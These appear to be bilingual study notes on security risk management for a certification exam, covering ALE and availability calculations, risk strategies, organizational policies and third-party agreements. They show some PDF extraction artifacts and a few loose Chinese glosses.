  - rely heavily on models that provide decision-making information in the form of quantitative metrics, which attempt to measure risk levels across a common scale.
Adding Objectivity to a Qualitative Assessment
Making a qualitative assessment more objective: assigning numeric values to the tables.
- Example:
- the impacts can be prioritized from highest to lowest and then weighted.
- values can be assigned to reflect how each risk was assessed. ◆
◆
The last step is to calculate an overall risk value for each risk area by multiplying 966

the weights times the assessed values: Risk = W1 × V1 + W2 × V2+...W4 × V4
 The
key assumptions underlie any model,
different models will produce different results even when given the same input data.
Although significant research and development have been invested in improving and refining the various risk analysis models, expert judgment and experience must still be considered an essential part of any risk-assessment process.
Models can never replace judgment and experience, but they can significantly enhance the decision-making process. Risk Calculation
More complex models permit a variety of analyses based on statistical and mathematical models. A common method is the calculation of the annualized loss expectancy (ALE). Calculating the ALE creates a monetary value of the impact. This calculation begins by calculating a single loss expectancy (SLE).
SLE - single loss expectancy
SLE = asset value × exposure factor
Exposure factor: a measure of the magnitude 重要性 of loss of an asset.
Example: assume the asset value of a small office building and its contents is $2 million, assume that this building houses the call center for a business, and the complete loss of the center would take away about half of the capability of the company = exposure factor is 50%. The SLE is $2 million × 0.5 = $1 million
ALE - annualized loss expectancy ALE = SLE × ARO
total monetary damage resulting from an exploited vulnerability.
ARO - annualized rate of occurrence
The annualized rate of occurrence (ARO) is a representation of the frequency of the event, measured in a standard year.
is defined by historical data, company’s own experience or from industry surveys.
TIP Numerous resources are available to help in calculating ALE. There are databases that contain information to help businesses (member institutions) manage exposure to loss from natural disasters such as hurricanes, earthquakes, and so forth. There is information on property perils 事故 such as fire, lightning, vandalism, windstorm, hail, and so forth. It even includes information to help evaluate the effectiveness of your building’s sprinkler systems.
If the event is expected to occur once in 20 years, then the ARO is 1/20.
Example: assume that a fire at this business’s location is expected to occur about once in 20 years. ALE is $1 million × 1/20 = $50,000
The ALE determines a threshold ⻔槛 for evaluating the cost/benefit ratio of a given countermeasure 对策.
Therefore, a countermeasure to protect this business adequately should cost no more than the calculated ALE of $50,000 per year.
Impact
The impact of an event is a measure of the actual loss when a threat exploits a vulnerability.
Federal Information Processing Standards (FIPS) 199 defines 3 levels of impact: high/moderate/low.
The impact needs to be defined in terms of the context of each organization, as what is high for some firms may be low for much larger firms. The common method is to define the impact levels in terms of important business criteria.
Impacts can be in terms of cost (dollars), performance (service level agreement [SLA] or other requirements), schedule (deliverables), or confidentiality, integrity, and availability.
MTTR — Mean time to repair
How long it takes to repair a given failure.
the average time, and may or may not include the time needed to obtain parts.
MTBF - Mean time between failure
A common measure of reliability of a system, the average time between system failures. The time between failures, measured from the time a system returns to service until the next failure.
MTBF = Σ (start of downtime – start of uptime) / number of failures
MTTF - Mean time to failure
a variation of MTBF, one that is commonly used instead of MTBF when the system is replaced in lieu of being repaired.
Other than the semantic difference, the calculations are the same, and the meaning is essentially the same.
Measurement of Availability
Amount of time a system performs its intended function.
Reliability: the frequency of system failures.
Availability: the time the system is in its operational state.
Availability = MTTF / (MTTF + MTTR)
Example: Assuming a system has an MTTF of 6 months and the repair takes 30 minutes, the availability would be
Availability = 6 months / (6 months + 30 minutes) = 99.9884%
Quantitative vs. Qualitative
Usually risk management includes both qualitative and quantitative elements, requiring both analysis and judgment or experience.
purely quantitative risk management: impossible to conduct
purely qualitative risk management: possible to accomplish
It is impossible to define and quantitatively measure all factors that exist in a given risk assessment, a risk assessment that measures no factors quantitatively but measures them all qualitatively is possible. The decision of whether to use qualitative versus quantitative risk management depends on the criticality of the project, the resources available, and the management style.
The decision will be influenced by the degree to which the fundamental risk management metrics, such as asset value, exposure factor, and threat frequency, can be quantitatively defined.
Quantitative risk management: assigning specific absolute values to risk qualitative risk management: accomplished with relative values.
定量决定细节。定性判断趋势. 比如:
  - 1. 2x=4
定性:x>0 定量:x=2
  - 2. 英国脱欧
定性:英镑将会贬值 定量:英镑汇率从9.3下降到8.8
  - 3. A攻打B
定性:从综合实力来看A能赢 定量:A要打赢B需要xxx兵力，以及xx战略方针
Vulnerabilities
Vulnerabilities: characteristics of an asset that can be exploited by a threat to cause harm. represents an exploitable weakness that increases the level of risk associated with the system.
Example: Your system has a security vulnerability, if you have not installed patches to fix a cross-site scripting (XSS) error on your website.
Not all errors or bugs are vulnerabilities.
For an error or bug to be classified as a vulnerability, it must be exploitable, meaning an attacker must be able to use the bug to cause a desired result. There are 3 elements needed for a vulnerability to occur:
The system must have a flaw.
The flaw must be accessible by an attacker.
The attacker must possess the ability to exploit the flaw.
Vulnerabilities can exist in many levels, from many causes, numerous forms
design errors, coding errors, or unintended/untested combinations in complex systems
can exist in software, hardware, and procedures.
Vulnerabilities can be fixed, removed, and mitigated.
They are part of any system and represent weaknesses that may be exploited.
Threat Vectors 矢量
Threats can be classified in groups, with the term threat vector describing the
elements of these groups.
A threat vector: the path or tool used by an attacker to attack a target. There are a wide range of threat vectors:
The Web (fake sites, session hijacking, malware, watering hole attacks) Wireless unsecured hotspots
Mobile devices (iOS/Android)
USB (removable) media
E-mail (links, attachments, malware)
Social engineering (deceptions, hoaxes, scams, and fraud)
From a defensive point of view, it is important not to become fixated on specific threats, but rather to pay attention to the threat vectors. If a user visits a website that has malicious code, then the nature of the code, although important from a technical view in one respect, is not the primary concern.
The primary issue is the malicious site, as this is the threat vector.
Probability/Threat Likelihood
The probability / likelihood of an event: a measure of how often it is expected to occur. the purpose is to allow scaling 缩放比例 based on frequency of an event.
From a qualitative assessment using terms such as frequent/occasionally/rare
to the quantitative measure ARO,
Determining the specific probabilities of security events with any accuracy is a nearly impossible feat. What is important in the use of probabilities and likelihoods is the relationship it has with respect to determining relative risk.
Just as insurance company cannot tell you when you will have an accident
What can be determined is that over some course of time, say the next year, a significant number of users will click malicious links in e-mails.
The threat likelihood of different types of attacks will change over time. Years ago, web defacements 毁损 were all the rage.
Today, spear phishing is more prevalent.
Risk-Avoidance, Transference, Acceptance, Mitigation, Deterrence
Risks cannot be removed or eliminated. Actions can be taken to change the effects that a risk poses to a system, but the risk itself doesn’t really change, no matter what actions are taken to mitigate that risk. ▪


## impact of that risk if it occurs.
A limited number of strategies can be used to manage risk. The risk can be avoided, transferred, mitigated, or accepted.
Risk Avoiding:
  - identifying a risk and making the decision to discontinue engaging in the
action
  - threats cannot be removed from the environment, one’s exposure can be altered.
  - Not deploying a module that increases risk is one manner of risk avoidance.
Risk transfer:
  - common method:
  - purchase insurance. Insurance allows risk to be transferred to a third party that manages specific types of risk for multiple parties, thus reducing the individual cost.
  - the protection against fraud on credit cards. The risk is transferred to another party, so people can use the card in confidence.
Risk Mitigation:
  - through the application of controls that reduce the impact of an attack.
  - Controls can alert operators so that the level of exposure is reduced through process intervention. When an action occurs that is outside the accepted risk profile, a second set of rules can be applied, such as calling the customer for verification before committing a transaction.
  - Controls such as these can act to reduce the risk associated with potential high-risk operations.
Risk acceptance:
     - accept responsibility for the risk if it does happen.
  - example: a manager may choose to allow a programmer to make “emergency” changes to a production system (in violation of good separation of duties) because the system cannot go down during a given period of time.
  - The manager accepts the risk: the programmer could possibly make unauthorized changes is outweighed by the high-availability requirement of that system.
  - However, there should always be some additional controls, like a management review or a standardized approval process, to ensure the assumed risk is adequately managed.
Understand that risk cannot be completely eliminated.
A risk that remains after implementing controls is termed a residual risk 存留下来 的. In this step, you further evaluate residual risks to identify where additional
controls are required to reduce risk even more. This leads us to the earlier statement, that the risk management process is iterative.
Type of vulnerability
System sprawl: run out of computer resources.
 The Cloud
Cloud computing: computer services provided over a network.
Computing services: computing/storage/applications/services, offered via the
Internet Protocol.
One of the characteristics of cloud computing is transparency to the end user. This improves usability of this form of service provisioning.
Cloud computing offers much to the user: improvements in performance, scalability, flexibility, security, and reliability, among other items.
These improvements are a direct result of the specific attributes associated with how cloud services are implemented.
The promise of cloud computing is improved utility and is marketed under the concepts of Platform as a Service, Software as a Service, and Infrastructure as a Service.
The challenge in managing risk in the cloud is in the advance determination of who has what level of security responsibility (the cloud provider, the service provider, or the user)
Risks Associated with Cloud Computing and Virtualization
When examining a complex system such as a cloud or virtual computing environment from a risk perspective, several basic considerations always need to be observed.
First, either cloud or virtualized, does not change how risk works.
  - Risk is everywhere, changing a system to a new environment does not
change the fact that there are risks. Second, complexity can increase risk exposure.
  - The addition of cloud and/or virtualization adds to the risk simply by adding complexity to the system.
There are specific risks associated with both virtualization and cloud environments.
Having data and computing occur in environments that are not under the direct control of the data owner adds both a layer of complexity and a degree of risk. The potential for issues with confidentiality, integrity, and availability increases with the loss of direct control over the environment. The virtualization and cloud layers also present new avenues of attack into a system.
Security is a particular challenge when data and computation are handled by a remote party, as in cloud computing, how to allow data outside your enterprise and yet remain in control over the use of the data.
The common answer is encryption. Through the proper use of encryption of data before it leaves the enterprise, external storage can still be performed securely by properly employing cryptographic elements.
The security requirements associated with confidentiality, integrity, and availability remain the responsibility of the data owner, and measures must be taken to ensure that these requirements are met, regardless of the location or usage associated with the data.
Another level of protections: use of service level agreements (SLAs) with the cloud vendor, but it cannot offer much remedy in the event of data loss.
Virtualization
Virtualization is the creation of virtual systems rather than actual hardware and software.
The separation of the hardware and software enables increased flexibility in the enterprise.
  - On top of actual hardware, a virtualization layer enables the creation of complete systems, including computers and networking equipment, as virtual machines.
This separation of hardware and software enables security through a series of improvements. hardware platforms can add to the security of a system.
Although vulnerabilities exist that can possibly allow processes in one virtual environment to breach the separation between virtual environments or the layer to the host, these are rare and exceptionally difficult to exploit.
A new form of vulnerability— the ability to make copies of complete virtual systems—must be addressed, as this could lead to data and intellectual property loss.
  - Protecting the storage of virtual systems must be on par with backups of regular systems to avoid wholesale loss.
Virtualized systems should be updated/patched similar to nonvirtualized systems.
Virtual systems still need security services to protect virtual machines from intrusions, malware, and the same threats that regular systems face.
Recovery Time Objective and Recovery Point Objective
Recovery time objective (RTO): the target time that is set for a resumption 重新开 始 of operations after an incident. defined by the business, based on the needs. A shorter RTO, higher costs, requires greater coordination and resources.
Recovery point objective (RPO): the time period representing the maximum period of acceptable data loss. The RPO defines the frequency of backup operations necessary to prevent unacceptable levels of data loss. establishing RPO: How much data can you afford to lose? How much rework is tolerable?
The RTO serves the purpose of defining the requirements for business continuity, while the RPO deals with backup frequency.
It is possible to have an RTO of 1 day and an RPO of 1 hour, or an RTO of 1 hour and an RPO of 1 day. The determining factors are the needs of the business. Policies, Standards, and Guidelines
The process of implementing and maintaining a secure network must first be addressed from a policies, standards, and guidelines perspective.
A security program (technology, processes, procedures, metrics, training, and personnel addressing security) should be based on an organization’s documented security policies, procedures, standards, and guidelines that specify what users and administrators should be doing to maintain the security of the systems and network.
Policies and guidelines set a standard of expectation in an organization. The process of developing these policies will help everyone in an organization become involved and invested in making security efforts successful.
Policies: high-level guidance on large issues, broad statements, what the organization wants to accomplish. By senior management.
Standards: tell people what is expected, 强制的 mandatory elements regarding the implementation of a policy. Some standards can be externally driven.
  - Example: Government regulations for banking and financial institutions, require certain security measures be taken. Standards is set by the organization to meet its own security goals.
Guidelines: recommadation, provide specific advice on how to accomplish a given task or activity. specific technology and security mechanisms required.
Procedures: step-by-step instructions, how to implement policies in the organization.
Practices:  Top-down policies: those that use the support of upper management.
bottom-up policies: often generated by the IT department with little intradepartmental 部⻔内
的 support.
The constant monitoring of the network and the periodic review of the relevant documents are part of the process that is the operational model. This operational process consists of 4 basic steps:
1. Plan (adjust) for security.
  - develop the policies, procedures, guidelines that will be implemented,
design the security components that will protect your network. 2. Implement the plans.
  - Once these are designed and developed, you can implement the plans. 3. Monitor the implementation. ▪


## policies, procedures, and guidelines, are working to secure your systems.
4. Evaluate the effectiveness.
  - evaluate the effectiveness of the security measures you have in place.
  - to ensure the security is adequate, the evaluation step can include:
  - a vulnerability assessment (identify and prioritize 区分优先次序 the list of vulnerabilities within a system or network)
  - a penetration test (check the security of a system by simulating an attack by a malicious individual)
After evaluating your security posture, you begin again with step one, this time adjusting the security mechanisms you have in place, and then continue with this cyclical process.
Policies
provide the people in an organization with guidance about their expected behavior. A good policy contains several key areas:
Scope 范围 Statement:
  - outlines what the policy intends to accomplish and which documents,
laws, and practices the policy addresses.
  - provides background, help understand and how it applies to them.
  - usually no more than a single sentence in length.
Policy Overview Statement:
  - provides the goal of the policy
  - why it’s important, and how to comply with it.
 ▪


##   - a single paragraph to provide a sense of the policy. Policy Statement:
  - the substance 主旨 of the policy.
  - as clear and unambiguous as possible.
Accountability Statement:
  - Provide who to contact if a problem is discovered.
  - indicate the consequences of not complying with the policy.
  - written in way as to leave no room for misinterpretation 误解 on the part of users.
- Exception Statement:
  - policy doesn’t foresee every eventuality.
  - provides specific guidance about the procedure or process that must be followed in order to deviate from the policy.
  - This may include an escalation contact to contact next. The policy development process is often time-consuming.
the decisions can be made in advance and can be sent to all involved parties so that the policy doesn’t have to be restated again.
saves time and provides structure: Instead of using valuable time trying to figure out what to do, employees will know exactly what to do.
Privacy Policy
For personal information, customers expect
   information to be kept secure
unauthorized individuals will not gain access to it
authorized users will not use the information in unintended ways.
privacy policy:
Explains guiding principles in guarding personal data to which they are given
access.
describes explicitly how information provided to the organization will be used (like it will not be sold to other organizations).
Example:
Watchdog organizations: monitor the use of individual information by organizations
businesses can subscribe to services that will vouch 担保 for the organization to consumers, stating that the company has agreed to protect and keep private any information supplied to it.
The organization granted permission to display a seal/certification.
Organizations misuse the information — penalties from the watchdog organization.
A special category of private information: Personally identifiable information (PII).
data that can be used to uniquely identify an individual.
Include: name, address, driver’s license number...
used extensively and protection has become increasingly important.
Organization that collects PII on its employees and customers must make sure that it takes all necessary measures to protect the data from compromise.
Acceptable Use Policy (AUP) An Acceptable use policy (AUP) outlines what the organization considers to be the appropriate use of its resources, such as computer systems, e-mail, Internet, and networks.
Organizations should be concerned about any personal use of organizational assets that does not benefit the company.
The goal of the policy is to ensure employee productivity while limiting potential organizational liability resulting from inappropriate use of the organization’s assets.
AUP should clearly delineate 描述 what activities are not allowed. AUP should address issues, like:
  - the use of resources to conduct personal business,
  - installation of hardware or software,
  - remote access to systems and networks,
  - the copying of company-owned software,
  - the responsibility of users to protect company assets (data, software, and hardware).
Statements regarding possible penalties for ignoring any of the policies should also be included.
Related to appropriate use of the organization’s computer systems and networks by employees is the appropriate use by the organization. The most important of such issues is whether the organization will consider it appropriate to monitor the employees’ use of the systems and network.
If monitoring is considered appropriate, the organization should include a statement to this effect in the banner that appears at login.
This repeatedly warns employees, and possible intruders, that their actions are subject to monitoring and that any misuse of the system will not be tolerated.
   - stipulating rules of behavior to be followed by users of computers, networks, and associated resources Should the organization need to use in either a civil or criminal case any information gathered during monitoring, the issue of whether the employee had an expectation of privacy / whether it was even legal for the organization to be monitoring,
is simplified if the organization can point to its repeatedly displayed statement that use of the system constitutes consent to monitoring.
Before any monitoring is conducted / actual wording on the warning message is created, the organization’s legal counsel should be consulted to determine the appropriate way to address this issue.
An Acceptable use policy outlines what is considered acceptable behavior for a system’s users.
This policy often goes hand-in-hand with an organization’s Internet usage policy.
 Organizational Policies
1. Structure (the organizational form of the IT function)
2. Information Architecture (is the infrastructure aligned with the
firm’s mission?)
 3. Communication (are the IT strategy and policies known by all affected parties?)
4. Compliance 服从 (are external regulations, laws being addressed?)
5. Risk assessment (are IT risks identified, measured and controlled?)
Human Resource Policies
1. Training (what kind of training and to whom?)
2. Travel (what are the travel guidelines and priorities?)
3. Hiring (who determines needs and who screens applicants?)
4. Promotion (what are the guidelines and how does the process
work?)
5. Termination (what are voluntary and involuntary termination guidelines?)
Security Policy
In keeping with the high-level nature of policies, the security policy is a high- level statement produced by senior management that outlines for organization what security means and what’s the security goals.
The main security policy can then be broken down into additional policies that cover specific topics. Statements such as “this organization will exercise the principle of least privilege in its handling of client information” would be an example of a security policy. The security policy can also describe how security is to be handled from an organizational point of view (like describing which office and corporate officer/manager oversees the organization’s security program).
In addition to policies related to access control, the organization’s security policy should include the specific policies described in the next sections.
All policies should be reviewed on a regular basis and updated as needed. policies should be updated less frequently than the procedures, since the high-
level goals will not change as often as the environment in which they must
be implemented.
All policies should be reviewed by the organization’s legal counsel
a plan should be outlined describing how the organization will ensure that
employees will be made aware of the policies.
Policies can also be made stronger by including references to the authority who
made the policy (policy comes from the CEO or is a department-level policy) and also refer to any laws or regulations that are applicable to the specific policy and environment.
An implicit deny is when a user or group are not granted a specific permission
         7.
1. 2. 3. 4. 5.
4.
1.
2. 3. 4. 5.
9.
1.
2.
3. 4.
10.
1.
2. 3.
4. 5.
Security Policies
Testing (how is security tested?)
Access (who can have access to what information and applications?) Monitoring (who monitors security?)
Firewalls (are they effectively utilized?)
Violations (what happens if an employee violates security?)
Software Policies
Acquisition (how is software acquired from outside vendors?)
Standards (what are the software compatibility standards?)
Outside contractors (should contractors be used for software development?) Changes (how to control and monitor the software change process?) Implementation (how to handle conversions, interfaces, and users?)
Contingency Policies
Backup (what are the backup procedures?)
Recovery (what is the recovery process?)
Disasters (who is in charge and what is the plan?) Alternate Sites (what types of sites are available for off-site processing?)
Financial and Accounting Policies
Project Management (are IT projects prioritized, managed, and monitored?)
Revenue Generation (should services be sold inside or outside the organization?)
Technology Investments (are the investment returns being properly evaluated?)
Funding Priorities (where to most effectively allocate resources?) Budgets (are budgets aligned with funding levels and priorities?)
in the security settings of an object, but they are not explicitly denied either. ▪


##  Business Policies
Business policies also affect the security of an organization. They address organizational and departmental business issues as opposed to corporate-wide personnel issues.
Policies has into 2 general categories: for vendors or personnel.
Policies for Vendors
business partners agreement (BPA)
An agreement between partners in a business that outlines their responsibilities, obligations, and sharing of profits and losses.
standard operating procedure (SOP):
The overriding 最重要的 policy for operations
   ▪


##  the baseline for business and covers the expected regular basis
crisis management: outlines what to do. (which vendor to call when the communications server crashes, who to notify when their keypads won’t allow access to the server room...)
Service-level agreements (SLAs)
equally important are business partner agreements (BPAs): outline responsibilities and obligations (sharing of profits and losses) between business partners.
These documents can be important when you need authorization for disaster to get the help and equipment needed to have everything functioning as it should be.
memorandum of understanding (MOU) memorandum of agreement (MOA)
define the terms and conditions for securely sharing data and information resources.
It is important that it identify the purpose for the interconnection’s existence. It should also identify who the relevant authorities are within each organization
and define their responsibilities. Since nothing lasts forever, conditions of terminating the agreement should be included in it as well as expected cost apportionment.
interconnection security agreement (ISA):
documents the technical and security requirements for establishing, operating, and maintaining the interconnection.
It works in conjunction with the MOU/A between organizations by spelling out the require- ments for connecting the IT systems and describing the security
controls to be used to protect the systems and data, and it includes any necessary topological drawings of the interconnection.
       Mandatory Vacations
Few organizations forced employees to take this time if they didn’t want to.
Choice of “use or lose” their vacation time, and if they do not take all of their time, they’ll lose at least a portion of it.
Many arguments can be made as to the benefit of taking time off,
from a security standpoint, an employee who never takes time off is a potential
indicator of nefarious activity.
  - never take vacation time could be involved in activity such as fraud or embezzlement and might be afraid that if they leave on vacation, the organization would discover their illicit activities.
As a result, requiring employees to use their vacation time through a Policy of mandatory vacations can be a security protection mechanism.
Using mandatory vacations as a tool to detect fraud will require that somebody else also be trained in the functions of the employee who is on vacation.
Having a second person familiar with security procedures is good policy in case something happens to the primary.
Job Rotation
provides individuals with a better perspective of how the various parts of the organization can enhance/hinder the business, can result in a much wider understanding of the organization’s security problems.
eliminates the need to rely on one individual for security expertise.
  - security will suffer if that individual is lost from the organization.
  - If that person become disgruntled and decide to harm the organization, recovering from their attack could be very difficult. Separation of Duties
Ensure that no single individual has the ability to conduct transactions alone.
Then the level of trust in any one individual is lessened,
The ability for individual to cause catastrophic 灾难性的 damage to the organization is lessened.
Example: an organization, one person order equipment, but another individual makes the payment. An individual who wants to make an unauthorized purchase for his own personal gain would have to convince another person to go along with the transaction.
Separating duties is a good practice, but it is possible to go overboard and break up transactions into too many pieces or require too much oversight.
This results in inefficiency and can actually be less secure
  - individuals may not scrutinize transactions as thoroughly because they know others will also be reviewing them.
  - The temptation 诱惑 is to hurry something along and assume that somebody else will examine it or has examined it.
It spreads responsibilities out over an organization
no single individual becomes the indispensable individual with all of the “keys to the kingdom” or unique knowledge about how to make everything work.
If enough tasks have been distributed, assigning a primary and a backup person for each task will ensure that the loss of any one individual will not have a disastrous impact on the organization.
Least Privilege
Two other common security principles, need to know and least privilege. Individual in organization is supplied with only the absolute minimum amount of ▪


##  To obtain access to any piece of information, the individual must have a justified need to know.
the employee will be granted only the bare minimum number of privileges that are needed to perform the job.
The policy should also address who in the organization can grant access to information or assign privileges to employees.
Standard
derived from policies.
provide enough detail that an audit can be performed to determine whether the standard is being met.
5 points key aspects of standards documents:
- Scope and Purpose: explain or describe the intention.
- Roles and Responsibilities:
  - outlines who is responsible for implementing, monitoring, and maintaining the standard.
  - doesn’t mean can’t exceed those roles; just to clear the responsible for accomplishing tasks.
- Reference Documents:
  - explains how the standard relates to the organization’s different policies,
connecting the standard to policies that been put in place.
  - For confusion or uncertainty, it allows people to go back to the source and figure out what the standard means.
  - a standard doesn’t make sense — referring to the policies, you can figure out why the standard was written as it was.
  - Doing so may help you carry out the standard or inform the people 992

▪
responsible for the standard of a change or problem.
- Performance Criteria:
  - outlines how to accomplish the task.
  - Baselines: minimum/starting point for the standard.
  - Technology standards: information about the platforms and
technologies.
  - Baseline standards: spell out high-level requirements for the standard or technology.
  - Benchmarking: define what will be measured and the metrics that will be used to do so.
- Maintenance and Administrative Requirements:
  - outline what is required to manage and administer the systems or
networks.
  - Example: physical security requirement, address the frequency of locks change.
◆
- Standards documents provide a mechanism to evaluate standards to be compliance.
- The process of evaluation: audit.
- Increasingly, organizations are being required to conduct regular audits of their
standards and policies.
Guidelines
help an organization implement/maintain standards by providing information on
how to accomplish the policies and maintain the standards.
 ▪


##  less formal than policies or standards
aren’t hard-and-fast rules, may provide step-by-step process and background information to accomplish a task.
Example: an explanation of how to install a service pack and what steps should be taken before doing so.
CobiT Guidelines
Guidelines suggest 11 processes should be incorporated into IT strategic plans. Each process is integrated throughout IT policy areas.
Processes designed to manage the key IT risks.
1. Develop a strategic IT plan.
2. Articulate the information architecture.
3. Find an optimal fit between IT and the company’s strategy.
4. Design the IT function to match the company’s needs.
5. Maximize the IT investment.
6. Communicate IT policies to the user community.
7. Manage the IT workforce.
8. Comply with external regulations, laws, and contracts.
9. Conduct IT risk assessments.
10. Maintain a high-quality systems development process.
11. Incorporate sound project management techniques.
The following four items represent the minimum contents of a good guidelines document:
Scope and Purpose: overview and statement of the guideline’s intent. Withour scope, things never ends.
  - No verbiage: “This document contains the guidelines and procedures for the assignment and use of xyz and establishes the minimum requirements
 ▪


## for governing the acceptable use of...”
  - scope and purpose, 2 separate headings:
  - Purpose: why it exists (“This policy establishes guidelines and minimum requirements governing...”)
  - Scope: whom it applies (“This policy applies to any employee who...”).
Roles and Responsibilities: identifies individuals/departments be responsible for accomplishing specific tasks.
  - may include: implementation, support, administration of system/service.
  - large organization, individuals will have different levels of training and
expertise.
  - From a security perspective, it could be disastrous if an unqualified technician installed a system without guidelines.
Guideline Statements: provide the step-by-step instructions/procedures to accomplish task in specific manner.
  - are guidelines or recommendations, may not be hard-and-fast rules, can even include shortcuts/suggestions.
Operational Considerations: specify and identify duties required and intervals.
  - might include daily, weekly, and monthly tasks.
  - Example:
  - Guidelines for systems backup, might provide specific guidance as to
which files and directories must be backed up and how frequently.
Guidelines help in 3 ways:
Process/steps isn’t performed routinely; guidelines help refresh memory.
   ▪


##  Train to thing new, guidelines reduce the learning curve. Crisis/stress situation, guidelines keep you from coming unglued.
 System-Level Processes
There are many processes that span across the enterprise, affecting the entire business.
These processes can have security implications.
These implications can at times manifest themselves in different areas than from where they are caused, hence they are best dealt with from the enterprise level.
On-boarding/Off-boarding Business Partners
Just as it is important to manage the on- and off-boarding processes of company personnel, it is important to consider the same types of elements when making arrangements with third parties.
Agreements with business partners tend to be fairly specific with respect to terms associated with mutual expectations associated with the process of the business.
Consideration are important, especially the off-boarding, when a contract arrangement with a third party comes to an end:
issues as to data retention 享用 and destruction by the third party need to be addressed.
These considerations need to be made prior to the establishment of the relationship, not added at the time that it is coming to an end.
On-boarding and off-boarding business procedures should be well documented to ensure compliance with legal requirements.
Social Media Networks
The rise of social media networks has changed many aspects of business.
When marketing, communications, customer relations, or some other purpose, social media networks can be considered a form of third party.
One of the challenges in working with social media networks/applications is their terms of use.
While a relationship with a typical third party involves a negotiated set of agreements with respect to requirements, there is no negotiation with social media networks.
The only option is to adopt their terms of service, it is important to understand the implications of these terms with respect to the business use of the social network. Interoperability Agreements
Many business operations involve actions between many different parties—some within an organization, and some in different organizations. These actions require communication between the parties, defining the responsibilities and expectations of the parties, the business objectives, and the environment within which the objectives will be pursued.
To ensure an agreement is understood between the parties, written agreements are used.
Numerous forms of legal agreements and contracts are used in business, but with respect to security, the most common ones: service level agreement, business partnership agreement, memorandum of understanding, and interconnection security agreement.
SLA - Service level agreement
negotiated agreement between parties (customer, supplier) and represent the
agreed-upon terms. Once entered into, the SLA becomes a legally binding document.
typically included as part of a service contract and set the level of technical expectations.
Typically, good SLA will satisfy two simple rules.
  - First, will describe the entire set of product or service functions in sufficient detail that their requirement will be unambiguous. detailing the expectations between a customer and a service provider. essentially set the requisite level of performance of a given contractual service.
  - Second, will provide a clear means of determining whether a specified function or service has been provided at the agreed-upon level of performance.
can define: specific services, the performance level associated with a service, issue management and resolution, and so on. BPA - business partnership agreement
a legal agreement between partners establishing the terms, conditions, and expectations of the relationship between the partners.
can cover a wide range of issues, including typical items such as:
  - the sharing of profits and losses,
  - the responsibilities of each partner,
  - the addition or removal of partners, and any other issues.
The Uniform Partnership Act (UPA), established by state law and convention, lays out a uniform set of rules associated with partnerships to resolve any partnership terms.
  - The terms in a UPA, designed as “one size fits all”, are not in the best interest of any specific partnership.
To avoid undesired outcomes that result from UPA terms, it is best for partnerships to spell out specifics in a BPA.
MOU - memorandum of understanding
a legal document, describe a bilateral agreement between parties.
expressing a set of intended actions between the parties with respect to some common pursuit职业 or goal.
more formal and detailed than a simple handshake, but it generally lacks the binding powers of a contract.
It is also common to find MOUs between different units within an organization to detail expectations associated with the common business interest.
ISA - interconnection security agreement
a specialized agreement between organizations that have interconnected IT systems. document the security requirements associated with the interconnection.
An ISA can be a part of an MOU detailing the specific technical security aspects
of a data interconnection.
Privacy Considerations
Integration with third parties can result in privacy considerations.
Privacy: control over one’s own data, the right to control information about you
and what others can do with that information.
When parties share data for business purposes, it is incumbent to ensure that the appropriate safeguards and restrictions are put in place. It is important that personally identifiable information (PII) be properly handled both inside the firm and across third-party relationships.
The first step is to define the requirements for protection of PII. These requirements should be part of the organization’s privacy policy.
the organization’s privacy policy sets the terms and conditions that one should expect concerning protection of their personal data.
By establishing and publishing the requirements associated with PII, an organization can ensure that the awareness of privacy requirements is spread throughout the organization and incorporated into plans, policies, and procedures.
The components of a privacy policy can vary, but some common components include:
Clearly designate the elements of PII that are being collected and stored.
Clearly state what the PII will be used for, including any transfer to third parties. Designate security provisions and storage time for stored PII.
Risk Awareness
Having third parties play a role in business operations does not alleviate the responsibility to manage risk. All aspects of risk management need to be examined in light of third-party relationships. Consideration needs to be placed on risks associated with data flows and potential exposure of the data. The data security elements of confidenti- ality, integrity, and availability need to be considered as appropriately defined by data requirements. The requirements for data protection and subsequent risk exposures need to be updated to include the aspects associated with third-party handling.
Data Issues
System integration with third parties frequently involves the sharing of data. Data can be shared for the purpose of processing or storage. Control over data is a significant issue in third-party relationships. There are numerous questions that need to be addressed. The question of who owns the data, both the data shared with third parties and subsequent data developed as part of the relationship, is an issue that needs to be established.
Unauthorized Data Sharing
Unauthorized data sharing can be a significant issue, and in today’s world, data has value and is frequently used for secondary purposes. Ensuring that all parties in the relation- ship understand the data-sharing requirements is an important prerequisite. Equally important is ensuring all parties understand the security requirements of shared data.
Data Ownership
Data requires a data owner. Data ownership roles for all data elements need to be defined in the business. Data ownership is a business function, where the requirements for security, privacy, retention and other business functions are established. Not all data requires the same handling restrictions, but all data requires these characteristics to be defined. This is the responsibility of the data owner.
Data Backups
Data ownership requirements include backup responsibilities. Data backup require- ments include determining the level of backup, restore objectives, and level of pro- tection requirements. These can be defined by the data owner and then executed by operational IT personnel. Determining the backup responsibilities and developing the necessary operational procedures to ensure that adequate backups occur are important security elements.
Policies and Procedures
Policies and procedures govern the operation of the business and represent a set of requirements developed from both internal and external requirements. External requirements may come from laws and regulations, contractual terms such as incor- poration of the Payment Card Industry Data Security Standard (PCI-DSS), or customer specifications. There are regulatory situations where specific business actions are required by law or regulation. In many cases, the laws or regulations specify that specific policies are in place to govern compliance. Understanding the specific requirements of the business environment may require assistance from supporting business functions, guidance from industry groups, or help from other sources. Determining the relevant security policies and procedures that apply to third-party relationships is a key element in ensuring that all elements of them are met during business operations. The bottom line is simple: in some business situations, policies and procedures may be mandated by outside regulation, and assistance may be required in ensuring compliance.
Agreements
Relationships with third parties are typically covered by a series of agreements of the types previously discussed in this chapter. It is important to have a process in place to assure that the agreements are properly reviewed to verify compliance and performance standards associated with the business.
Chapter Review
In this chapter, you became acquainted with the principles of integration with third parties. System integration with third parties expands the risk-associated business pro- cesses. The chapter opened with a discussion of the interoperability agreements, including service level agreements, business partnership agreements, memorandums of understanding, and interconnection security agreements. The chapter continued with an examination of the data issues and risk associated with sharing with third parties. It covered privacy considerations, including issues with PII, and then presented policies and procedures and how they are employed across third parties via agreements. The chapter closed with an examination of the challenges associated with sharing via social media networks. ▪


## systems and data with third parties.
Automation/Scripting
The days of relying on someone in the server room to see a problem and push a button to head it off are coming to a close.
Thanks to sophisticated monitors and sensors, it is possible to use automation/ scripting 脚本 to preplan automated courses of action.
automated courses of action can: be taken range from configuration validation of new equipment added to continuous monitoring of server operations.
Frameworks and Templates
Templates 模板:
providing a means to summarize and document results of threat source
identification, characterization, vulnerabilities, and impacts.
Typical templates include scales for evaluating the threats and deciding the best responses to them.
Master Image
Most newer operating systems allow you to create a model user system as a disk image on a server;
